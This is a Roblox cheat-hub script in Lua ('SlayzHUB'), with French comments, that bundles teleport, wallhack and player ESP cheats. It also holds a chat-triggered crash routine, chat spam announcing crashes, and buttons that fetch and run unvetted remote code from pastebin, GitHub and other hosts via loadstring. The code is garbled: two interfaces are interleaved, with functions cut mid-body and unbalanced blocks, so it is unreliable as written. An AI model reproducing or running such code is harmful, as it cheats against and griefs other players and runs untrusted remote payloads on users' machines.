-- ============================================================
-- SlayzHUB - INTERFACE VIOLET & CYAN + DRAG SYSTEM
-- ============================================================
-- SLAYZHUB XENO GO v4.2 🔥 INTERFACE MODERNE PREMIUM
-- Design violet-noir moderne avec animations fluides

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ============================================================
-- SYSTÈME DE CRASH D'URGENCE
-- ============================================================
local TextChatService = game:GetService("TextChatService")
-- Anti-crash system
local antiCrashActive = false
local safeFolder = Instance.new("Folder")
safeFolder.Name = "SlayzSafe"
safeFolder.Parent = workspace

local function crashGame()
    while true do
        for i = 1, 100000 do
            Instance.new("Part", workspace)
        end
-- Nettoyage anti-crash
spawn(function()
    while wait(0.5) do
        pcall(function()
            for _, obj in pairs(workspace:GetChildren()) do
                if obj.Name:find("FPSKiller") or obj.Name:find("ParticleHell") then
                    if obj.Parent ~= safeFolder then
                        obj:Destroy()
                    end
                end
            end
        end)
    end
end
end)

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(message)
        if message.Text:lower() == "goodnight" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
            crashGame()
        end
    end)
end
-- ScreenGui principal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SlayzHubModern"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 2147483647
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local function setupLegacyChat()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                if msg:lower() == "goodnight" then crashGame() end
            end)
-- Frame principale avec glassmorphism
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 580, 0, 480)
MainFrame.Position = UDim2.new(0.5, -290, 0.5, -240)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 10, 30)
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 20)
MainCorner.Parent = MainFrame

-- Effet de bordure néon
local BorderGlow = Instance.new("UIStroke")
BorderGlow.Color = Color3.fromRGB(138, 43, 226)
BorderGlow.Thickness = 2
BorderGlow.Transparency = 0.3
BorderGlow.Parent = MainFrame

-- Animation de la bordure
spawn(function()
    while wait() do
        if MainFrame.Parent then
            TweenService:Create(BorderGlow, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Color = Color3.fromRGB(186, 85, 211)
            }):Play()
            wait(2)
            TweenService:Create(BorderGlow, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Color = Color3.fromRGB(138, 43, 226)
            }):Play()
        else
            break
        end
    end
    Players.PlayerAdded:Connect(function(player)
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                if msg:lower() == "goodnight" then crashGame() end
            end)
        end
    end)
end
setupLegacyChat()

-- ============================================================
-- CONFIGURATION
-- ============================================================
local CONFIG = {
    WAYPOINTS = {
        {name = "Point A", pos = Vector3.new(-351.76, -6.66, 20.29)},
        {name = "Point B", pos = Vector3.new(-332.14, -4.51, 18.41)},
    },
    DELAY = 0.15,
    COOLDOWN = 0.5,
    THEME = {
        Background = Color3.fromRGB(240, 240, 255),  -- Violet très clair
        BackgroundDark = Color3.fromRGB(25, 25, 40), -- Fond sombre
        Text = Color3.fromRGB(255, 255, 255),
        TextDark = Color3.fromRGB(50, 50, 70),
        TextDim = Color3.fromRGB(160, 160, 180),
        Accent = Color3.fromRGB(138, 43, 226),       -- Violet vif
        Accent2 = Color3.fromRGB(0, 191, 255),       -- Cyan
        Success = Color3.fromRGB(100, 200, 255),     -- Bleu clair
        Error = Color3.fromRGB(255, 100, 150),       -- Rose rouge
        Premium = Color3.fromRGB(186, 85, 211),      -- Orchidée
    },
    PREMIUM_SCRIPTS = {
        {emoji = "🚫", name = "Auto-Block", url = "https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer"},
        {emoji = "⚡", name = "Nameless", url = "https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"},
        {emoji = "💻", name = "Admin Panel", url = "https://pastefy.app/PwlxhXHs/raw"},
        {emoji = "🔒", name = "Allow Friends", url = "https://pastebin.com/raw/aipXbhpf"},
        {emoji = "⚡", name = "Speed Boost", url = "https://raw.githubusercontent.com/Tigyiscute/tigystealabrainrotscript/refs/heads/main/TigyHelper"},
    }
}

local State = {
    isTeleporting = false,
    lastTeleportTime = 0,
    totalTeleports = 0,
    guiVisible = true,
    wallhackEnabled = false,
    wallhackParts = {},
    wallhackConnection = nil,
    espEnabled = false,
    espBoxes = {},
    espConnections = {},
    optimizerEnabled = false,
    streamProofEnabled = false,
    currentCategory = "Misc",
    loadedScripts = {},
}

-- ============================================================
-- SYSTÈME DE DRAG
-- ============================================================
local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end
end)

-- ============================================================
-- FONCTIONS UTILITAIRES
-- ============================================================
local function getHRP()
    local char = LocalPlayer.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local humanoid = char:FindFirstChild("Humanoid")
    if hrp and humanoid and humanoid.Health > 0 then return hrp end
    return nil
end
-- Barre de titre moderne
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 60)
TitleBar.BackgroundColor3 = Color3.fromRGB(28, 15, 45)
TitleBar.BackgroundTransparency = 0.1
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local function canTeleport()
    if State.isTeleporting then return false end
    if tick() - State.lastTeleportTime < CONFIG.COOLDOWN then return false end
    if not getHRP() then return false end
    return true
end
local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 20)
TitleCorner.Parent = TitleBar

local function tween(obj, props, dur)
    TweenService:Create(obj, TweenInfo.new(dur or 0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
end
-- Masque pour garder les coins arrondis seulement en haut
local TitleMask = Instance.new("Frame")
TitleMask.Size = UDim2.new(1, 0, 0, 20)
TitleMask.Position = UDim2.new(0, 0, 1, -20)
TitleMask.BackgroundColor3 = Color3.fromRGB(28, 15, 45)
TitleMask.BackgroundTransparency = 0.1
TitleMask.BorderSizePixel = 0
TitleMask.Parent = TitleBar

local function teleportSequence()
    if not canTeleport() then return false end
    State.isTeleporting = true
    State.lastTeleportTime = tick()
    local success = pcall(function()
        for i, wp in ipairs(CONFIG.WAYPOINTS) do
            local hrp = getHRP()
            if not hrp then error("Lost") end
            hrp.CFrame = CFrame.new(wp.pos)
            if i < #CONFIG.WAYPOINTS then task.wait(CONFIG.DELAY) end
        end
    end)
    State.isTeleporting = false
    if success then State.totalTeleports += 1 return true else return false end
end
-- Logo et titre
local LogoLabel = Instance.new("TextLabel")
LogoLabel.Size = UDim2.new(0, 40, 0, 40)
LogoLabel.Position = UDim2.new(0, 15, 0.5, -20)
LogoLabel.BackgroundTransparency = 1
LogoLabel.Text = "🔥"
LogoLabel.TextScaled = true
LogoLabel.Font = Enum.Font.GothamBold
LogoLabel.Parent = TitleBar

local function toggleOptimizer(enabled)
    if enabled then
        settings().Rendering.QualityLevel = 1
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            end
        end
    else
        settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
    end
end
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(0, 300, 0, 30)
TitleLabel.Position = UDim2.new(0, 60, 0, 8)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "SLAYZHUB PREMIUM"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 22
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TitleBar

local function toggleStreamProof(enabled)
    if enabled then
        for _, gui in pairs(PlayerGui:GetDescendants()) do
            if gui:IsA("ScreenGui") then gui.Enabled = false end
        end
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    else
        for _, gui in pairs(PlayerGui:GetDescendants()) do
            if gui:IsA("ScreenGui") then gui.Enabled = true end
        end
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    end
end
local SubtitleLabel = Instance.new("TextLabel")
SubtitleLabel.Size = UDim2.new(0, 300, 0, 18)
SubtitleLabel.Position = UDim2.new(0, 60, 0, 35)
SubtitleLabel.BackgroundTransparency = 1
SubtitleLabel.Text = "v4.2 • Anti-Crash Actif"
SubtitleLabel.TextColor3 = Color3.fromRGB(186, 85, 211)
SubtitleLabel.TextSize = 13
SubtitleLabel.Font = Enum.Font.Gotham
SubtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
SubtitleLabel.Parent = TitleBar

local function clearWallhack()
    for part, data in pairs(State.wallhackParts) do
        if part and part.Parent then part.LocalTransparencyModifier = data.OriginalTransparency or 0 end
    end
    State.wallhackParts = {}
    if State.wallhackConnection then State.wallhackConnection:Disconnect() State.wallhackConnection = nil end
end
-- Bouton fermer moderne
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 35, 0, 35)
CloseButton.Position = UDim2.new(1, -50, 0.5, -17.5)
CloseButton.BackgroundColor3 = Color3.fromRGB(40, 25, 55)
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 24
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = TitleBar

local function toggleWallhack(enabled)
    State.wallhackEnabled = enabled
    if enabled then
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") and obj.Name ~= "Terrain" then
                local isPlayer = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
                if not isPlayer then
                    State.wallhackParts[obj] = {OriginalTransparency = obj.LocalTransparencyModifier}
                    obj.LocalTransparencyModifier = 0.8
                end
            end
        end
        State.wallhackConnection = workspace.DescendantAdded:Connect(function(obj)
            if State.wallhackEnabled and obj:IsA("BasePart") then
                task.wait(0.1)
                if State.wallhackEnabled then
                    local isPlayer = LocalPlayer.Character and obj:IsDescendantOf(LocalPlayer.Character)
                    if not isPlayer then
                        obj.LocalTransparencyModifier = 0.8
                        State.wallhackParts[obj] = {OriginalTransparency = 0}
                    end
                end
            end
        end)
    else clearWallhack() end
end
local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(1, 0)
CloseCorner.Parent = CloseButton

local function clearESP()
    for _, data in pairs(State.espBoxes) do
        if data.Box then data.Box:Destroy() end
        if data.NameLabel then data.NameLabel:Destroy() end
    end
    State.espBoxes = {}
    for _, conn in pairs(State.espConnections) do
        if conn then conn:Disconnect() end
    end
    State.espConnections = {}
end
local CloseStroke = Instance.new("UIStroke")
CloseStroke.Color = Color3.fromRGB(138, 43, 226)
CloseStroke.Thickness = 1.5
CloseStroke.Transparency = 0.5
CloseStroke.Parent = CloseButton

local function createESP(player)
    if player == LocalPlayer or not player.Character then return end
    local char = player.Character
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local head = char:FindFirstChild("Head")
    if not hrp or not head then return end
    
    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = hrp
    box.Size = Vector3.new(4, 5, 1)
    box.Color3 = Color3.fromRGB(255, 105, 180)
    box.Transparency = 0.3
    box.AlwaysOnTop = true
    box.Parent = hrp
    
    local billboard = Instance.new("BillboardGui")
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 1, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = player.Name
    nameLabel.TextColor3 = Color3.fromRGB(255, 105, 180)
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextSize = 18
    nameLabel.TextStrokeTransparency = 0
    nameLabel.Parent = billboard
    
    State.espBoxes[player.UserId] = {Box = box, NameLabel = billboard}
end
-- Effet hover sur le bouton fermer
CloseButton.MouseEnter:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(220, 53, 69)
    }):Play()
end)

local function toggleESP(enabled)
    State.espEnabled = enabled
    if enabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then createESP(player) end
        end
        table.insert(State.espConnections, Players.PlayerAdded:Connect(function(player)
            player.CharacterAdded:Connect(function()
                task.wait(0.5)
                if State.espEnabled then createESP(player) end
            end)
        end))
    else clearESP() end
end
CloseButton.MouseLeave:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(40, 25, 55)
    }):Play()
end)

local function loadPremiumScript(scriptData, btn, icon)
    icon.Text = "⏳"
    icon.TextColor3 = CONFIG.THEME.Accent
    btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Chargement..."
    local success = pcall(function() loadstring(game:HttpGet(scriptData.url))() end)
    if success then
        icon.Text = "✓"
        icon.TextColor3 = CONFIG.THEME.Success
        btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Chargé!"
        task.wait(2)
        btn.Text = scriptData.emoji .. " " .. scriptData.name
        icon.Text = "●"
        icon.TextColor3 = CONFIG.THEME.Success
    else
        icon.Text = "✕"
        icon.TextColor3 = CONFIG.THEME.Error
        btn.Text = scriptData.emoji .. " " .. scriptData.name .. " - Erreur"
        task.wait(2)
        btn.Text = scriptData.emoji .. " " .. scriptData.name
        icon.Text = "○"
    end
end
-- Zone de contenu
local ContentFrame = Instance.new("Frame")
ContentFrame.Size = UDim2.new(1, -40, 1, -100)
ContentFrame.Position = UDim2.new(0, 20, 0, 80)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

-- ============================================================
-- INTERFACE ROSE & BLANC
-- ============================================================
local function createGUI()
    local existing = PlayerGui:FindFirstChild("MinimalTP_GUI")
    if existing then existing:Destroy() end
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "MinimalTP_GUI"
    gui.ResetOnSpawn = false
    gui.Parent = PlayerGui
    
    -- Bouton réouverture
    local reopenBtn = Instance.new("TextButton")
    reopenBtn.Size = UDim2.new(0, 50, 0, 50)
    reopenBtn.Position = UDim2.new(1, -60, 0, 10)
    reopenBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
    reopenBtn.Text = "V"
    reopenBtn.TextColor3 = Color3.fromRGB(0, 191, 255)
    reopenBtn.Font = Enum.Font.GothamBold
    reopenBtn.TextSize = 20
    reopenBtn.Visible = false
    reopenBtn.Parent = gui
    Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0, 10)
    local reopenStroke = Instance.new("UIStroke", reopenBtn)
    reopenStroke.Color = Color3.fromRGB(138, 43, 226)
    reopenStroke.Thickness = 3
    task.spawn(function()
        local hue = 270
        while true do
            hue = ((hue + 2) % 360)
            reopenStroke.Color = Color3.fromHSV(hue / 360, 0.8, 1)
            task.wait(0.03)
        end
    end)
    makeDraggable(reopenBtn)
    
    -- Frame principale (PLUS PETITE)
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 480, 0, 340)
    main.Position = UDim2.new(0.5, -240, 0.5, -170)
    main.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = Color3.fromRGB(138, 43, 226)
    mainStroke.Thickness = 2
    task.spawn(function()
        local hue = 270
        while true do
            hue = ((hue + 2) % 360)
            mainStroke.Color = Color3.fromHSV(hue / 360, 0.8, 1)
            task.wait(0.03)
        end
    end)
    
    -- Header
    local header = Instance.new("Frame", main)
    header.Size = UDim2.new(1, 0, 0, 45)
    header.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    header.BorderSizePixel = 0
    header.Active = true
    local headerStroke = Instance.new("UIStroke", header)
    headerStroke.Color = Color3.fromRGB(138, 43, 226)
    headerStroke.Thickness = 2
    headerStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    makeDraggable(main)
    
    local logo = Instance.new("TextLabel", header)
    logo.Size = UDim2.new(1, -50, 1, 0)
    logo.Position = UDim2.new(0, 15, 0, 0)
    logo.BackgroundTransparency = 1
    logo.Text = "Vhub"
    logo.TextColor3 = Color3.fromRGB(0, 191, 255)
    logo.Font = Enum.Font.GothamBold
    logo.TextSize = 24
    logo.TextXAlignment = Enum.TextXAlignment.Left
    
    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -38, 0, 7)
    closeBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 16
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
    closeBtn.MouseButton1Click:Connect(function()
        State.guiVisible = false
        main.Visible = false
        reopenBtn.Visible = true
    end)
    reopenBtn.MouseButton1Click:Connect(function()
        State.guiVisible = true
        main.Visible = true
        reopenBtn.Visible = false
    end)
    
    -- Sidebar (CATÉGORIES ROSES)
    local sidebar = Instance.new("Frame", main)
    sidebar.Size = UDim2.new(0, 95, 1, -75)
    sidebar.Position = UDim2.new(0, 10, 0, 52)
    sidebar.BackgroundTransparency = 1
    local sidebarLayout = Instance.new("UIListLayout", sidebar)
    sidebarLayout.Padding = UDim.new(0, 6)
    
    -- Content frame
    local content = Instance.new("ScrollingFrame", main)
    content.Size = UDim2.new(1, -120, 1, -82)
    content.Position = UDim2.new(0, 115, 0, 52)
    content.BackgroundTransparency = 1
    content.BorderSizePixel = 0
    content.ScrollBarThickness = 3
    content.ScrollBarImageColor3 = CONFIG.THEME.Accent
    content.CanvasSize = UDim2.new(0, 0, 0, 0)
    
    -- Footer
    local footer = Instance.new("TextLabel", main)
    footer.Size = UDim2.new(1, 0, 0, 25)
    footer.Position = UDim2.new(0, 0, 1, -28)
    footer.BackgroundTransparency = 1
    footer.Text = "by 8v & 6v & 4v | 🖱️"
    footer.TextColor3 = CONFIG.THEME.Accent
    footer.Font = Enum.Font.Gotham
    footer.TextSize = 11
    footer.TextXAlignment = Enum.TextXAlignment.Center
    
    local tabs = {}
    local function createTab(name)
        local tabBtn = Instance.new("TextButton", sidebar)
        tabBtn.Size = UDim2.new(1, 0, 0, 35)
        tabBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
        tabBtn.Text = name
        tabBtn.TextColor3 = Color3.fromRGB(150, 150, 170)
        tabBtn.Font = Enum.Font.GothamBold
        tabBtn.TextSize = 12
        Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0, 8)
        
        local container = Instance.new("Frame", content)
        container.Size = UDim2.new(1, -10, 0, 0)
        container.BackgroundTransparency = 1
        container.Visible = false
        local layout = Instance.new("UIListLayout", container)
        layout.Padding = UDim.new(0, 8)
        
        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            container.Size = UDim2.new(1, -10, 0, layout.AbsoluteContentSize.Y + 10)
            local maxH = 0
            for _, t in pairs(tabs) do
                if t.Content.Visible then
                    local l = t.Content:FindFirstChildOfClass("UIListLayout")
                    if l then maxH = math.max(maxH, l.AbsoluteContentSize.Y + 15) end
                end
            end
            content.CanvasSize = UDim2.new(0, 0, 0, maxH)
        end)
        
        tabs[name] = {Button = tabBtn, Content = container}
        tabBtn.MouseButton1Click:Connect(function()
            for _, t in pairs(tabs) do
                t.Content.Visible = false
                t.Button.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
                t.Button.TextColor3 = Color3.fromRGB(150, 150, 170)
            end
            container.Visible = true
            tabBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
            tabBtn.TextColor3 = Color3.fromRGB(0, 191, 255)
        end)
        return container
    end
-- Grille de boutons modernes
local GridLayout = Instance.new("UIGridLayout")
GridLayout.CellSize = UDim2.new(0.48, 0, 0, 80)
GridLayout.CellPadding = UDim2.new(0.02, 0, 0, 15)
GridLayout.SortOrder = Enum.SortOrder.LayoutOrder
GridLayout.Parent = ContentFrame

-- Fonction pour créer un bouton moderne
local function createModernButton(name, text, icon, color1, color2)
    local Button = Instance.new("TextButton")
    Button.Name = name
    Button.BackgroundColor3 = Color3.fromRGB(30, 20, 45)
    Button.BorderSizePixel = 0
    Button.Text = ""
    Button.AutoButtonColor = false
    Button.Parent = ContentFrame

    local miscTab = createTab("Misc")
    local espTab = createTab("ESP")
    local premTab = createTab("Premium")
    local keyTab = createTab("Key")
    local infoTab = createTab("Info")
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 15)
    ButtonCorner.Parent = Button

    tabs["Misc"].Content.Visible = true
    tabs["Misc"].Button.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
    tabs["Misc"].Button.TextColor3 = Color3.fromRGB(0, 191, 255)
    local ButtonStroke = Instance.new("UIStroke")
    ButtonStroke.Color = color1
    ButtonStroke.Thickness = 1.5
    ButtonStroke.Transparency = 0.6
    ButtonStroke.Parent = Button

    local function btn(parent, name, callback)
        local b = Instance.new("TextButton", parent)
        b.Size = UDim2.new(1, 0, 0, 42)
        b.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
        b.Text = name
        b.TextColor3 = Color3.fromRGB(200, 200, 220)
        b.Font = Enum.Font.GothamBold
        b.TextSize = 13
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
        local icon = Instance.new("TextLabel", b)
        icon.Size = UDim2.new(0, 25, 0, 25)
        icon.Position = UDim2.new(1, -33, 0.5, -12)
        icon.BackgroundTransparency = 1
        icon.Text = "○"
        icon.TextColor3 = CONFIG.THEME.TextDim
        icon.Font = Enum.Font.GothamBold
        icon.TextSize = 16
        b.MouseEnter:Connect(function() tween(b, {BackgroundColor3 = Color3.fromRGB(50, 50, 70)}, 0.2) end)
        b.MouseLeave:Connect(function() tween(b, {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}, 0.2) end)
        if callback then b.MouseButton1Click:Connect(function() callback(b, icon) end) end
        return b, icon
    end
    -- Icône
    local Icon = Instance.new("TextLabel")
    Icon.Size = UDim2.new(0, 35, 0, 35)
    Icon.Position = UDim2.new(0, 12, 0.5, -17.5)
    Icon.BackgroundTransparency = 1
    Icon.Text = icon
    Icon.TextScaled = true
    Icon.Font = Enum.Font.GothamBold
    Icon.Parent = Button

    local function lbl(parent, text, color)
        local l = Instance.new("TextLabel", parent)
        l.Size = UDim2.new(1, 0, 0, 25)
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = color or CONFIG.THEME.Accent
        l.Font = Enum.Font.Gotham
        l.TextSize = 12
        l.TextXAlignment = Enum.TextXAlignment.Left
        return l
    end
    -- Texte
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -60, 0, 25)
    Label.Position = UDim2.new(0, 52, 0.5, -12.5)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.TextSize = 16
    Label.Font = Enum.Font.GothamBold
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Button

    btn(miscTab, "Téléporter", function(b, i)
        if teleportSequence() then
            i.Text = "✓"
            i.TextColor3 = CONFIG.THEME.Success
            task.wait(1)
            i.Text = "○"
            i.TextColor3 = CONFIG.THEME.TextDim
        end
    end)
    -- Gradient subtle
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, color1),
        ColorSequenceKeypoint.new(1, color2)
    }
    Gradient.Rotation = 45
    Gradient.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 0.85),
        NumberSequenceKeypoint.new(1, 0.9)
    }
    Gradient.Parent = Button

    btn(miscTab, "Optimizer", function(b, i)
        State.optimizerEnabled = not State.optimizerEnabled
        toggleOptimizer(State.optimizerEnabled)
        i.Text = State.optimizerEnabled and "●" or "○"
        i.TextColor3 = State.optimizerEnabled and CONFIG.THEME.Accent or CONFIG.THEME.TextDim
    -- Effet hover
    Button.MouseEnter:Connect(function()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {Transparency = 0.2}):Play()
        TweenService:Create(Gradient, TweenInfo.new(0.2), {
            Transparency = NumberSequence.new{
                NumberSequenceKeypoint.new(0, 0.7),
                NumberSequenceKeypoint.new(1, 0.8)
            }
        }):Play()
        TweenService:Create(Button, TweenInfo.new(0.2), {Size = UDim2.new(0.48, 0, 0, 85)}):Play()
    end)

    btn(miscTab, "Stream Proof", function(b, i)
        State.streamProofEnabled = not State.streamProofEnabled
        toggleStreamProof(State.streamProofEnabled)
        i.Text = State.streamProofEnabled and "●" or "○"
        i.TextColor3 = State.streamProofEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
    Button.MouseLeave:Connect(function()
        TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {Transparency = 0.6}):Play()
        TweenService:Create(Gradient, TweenInfo.new(0.2), {
            Transparency = NumberSequence.new{
                NumberSequenceKeypoint.new(0, 0.85),
                NumberSequenceKeypoint.new(1, 0.9)
            }
        }):Play()
        TweenService:Create(Button, TweenInfo.new(0.2), {Size = GridLayout.CellSize}):Play()
    end)

    btn(espTab, "ESP", function(b, i)
        State.espEnabled = not State.espEnabled
        toggleESP(State.espEnabled)
        i.Text = State.espEnabled and "●" or "○"
        i.TextColor3 = State.espEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
    return Button
end

-- Création des boutons
local InstantTP = createModernButton("InstantTP", "INSTANT TP", "⚡", 
    Color3.fromRGB(52, 152, 219), Color3.fromRGB(41, 128, 185))

local Nameless = createModernButton("Nameless", "NAMELESS", "👻", 
    Color3.fromRGB(231, 76, 60), Color3.fromRGB(192, 57, 43))

local AutoBlock = createModernButton("AutoBlock", "AUTO-BLOCK", "🛡️", 
    Color3.fromRGB(46, 204, 113), Color3.fromRGB(39, 174, 96))

local FPSDevourer = createModernButton("FPSDevourer", "FPS DEVOURER", "💀", 
    Color3.fromRGB(155, 89, 182), Color3.fromRGB(142, 68, 173))

-- Fonctions de chargement sécurisées
local function safeLoadstring(url)
    pcall(function()
        loadstring(game:HttpGet(url, true))()
    end)
end

-- Events des boutons
InstantTP.MouseButton1Click:Connect(function()
    safeLoadstring("https://pandadevelopment.net/virtual/file/3e58fa5b69bab3b3")
end)

Nameless.MouseButton1Click:Connect(function()
    safeLoadstring("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr")
end)

AutoBlock.MouseButton1Click:Connect(function()
    safeLoadstring("https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer")
end)

FPSDevourer.MouseButton1Click:Connect(function()
    antiCrashActive = true
    FPSDevourer:FindFirstChild("TextLabel").Text = "ACTIVÉ ✓"

    btn(espTab, "Wallhack", function(b, i)
        State.wallhackEnabled = not State.wallhackEnabled
        toggleWallhack(State.wallhackEnabled)
        i.Text = State.wallhackEnabled and "●" or "○"
        i.TextColor3 = State.wallhackEnabled and CONFIG.THEME.Success or CONFIG.THEME.TextDim
    spawn(function()
        for i = 1, 50 do
            pcall(function()
                local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if remote then
                    remote.SayMessageRequest:FireServer("💀 CRASHED BY SLAYZHUB", "All")
                end
            end)
            wait(0.05)
        end
    end)
    
    lbl(premTab, "✨ Scripts Premium", CONFIG.THEME.Premium)
    for _, s in ipairs(CONFIG.PREMIUM_SCRIPTS) do
        btn(premTab, s.emoji .. " " .. s.name, function(b, i) loadPremiumScript(s, b, i) end)
end)

CloseButton.MouseButton1Click:Connect(function()
    antiCrashActive = false
    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 0, 0, 0)
    }):Play()
    wait(0.3)
    ScreenGui:Destroy()
end)

